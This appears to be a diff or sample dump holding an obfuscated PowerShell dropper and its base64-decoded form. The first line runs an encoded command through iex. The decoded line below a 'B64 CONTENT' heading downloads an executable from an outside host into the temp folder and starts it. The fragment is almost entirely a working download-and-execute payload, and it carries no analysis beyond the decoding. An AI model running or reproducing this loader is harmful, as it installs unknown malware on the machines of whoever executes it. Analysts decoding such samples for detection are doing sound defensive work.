@@ -1,0 +1,7 @@
+iex([sySteM.Text.eNCoDINg]::UtF8.geTStriNg([SYstEM.COnVeRT]::FrombaSe64String('CihOZXctT2JqZWN0IFN5U3RlTS5ORXQud0ViY0xJRU5UKS5kb1dObG9hREZJbEUoJ2h0dHA6Ly9uaWtpbC50ay9iMS9ib18wMDEuZXhlJywiJEVOdjpURU1QXGJvXzAwMS5leGUiKTtTdGFydC1Qcm9jZXNzICgiJEVOdjpURU1QXGJvXzAwMS5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SySteM.NEt.wEbcLIENT).doWNloaDFIlE('http://nikil.tk/b1/bo_001.exe',"$ENv:TEMP\bo_001.exe");Start-Process ("$ENv:TEMP\bo_001.exe")
+
